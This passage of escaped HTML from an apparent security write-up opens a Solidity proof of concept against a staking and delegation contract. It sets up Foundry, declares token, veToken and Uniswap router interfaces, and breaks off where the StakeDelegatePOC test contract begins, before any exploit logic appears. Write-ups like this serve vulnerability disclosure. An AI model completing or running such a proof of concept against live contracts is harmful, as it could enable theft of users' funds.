d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eCreate a new foundry project, set \u003ccode\u003eBASE_RPC_URL\u003c/code\u003e, and run.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003espender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edistributeTaxTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprojectTaxPendingSwap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprojectTaxRecipient\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetProjectTaxRecipient\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprojectTaxRecipient_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetSwapThresholdBasisPoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint16\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapThresholdBasisPoints_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetProjectTaxRates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint16\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewProjectBuyTaxBasisPoints_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint16\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewProjectSellTaxBasisPoints_\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edelegates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIUniswapV2Router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapExactTokensForTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOutMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountADesired\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountBDesired\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountAMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountBMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eStakeDelegatePOC\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e 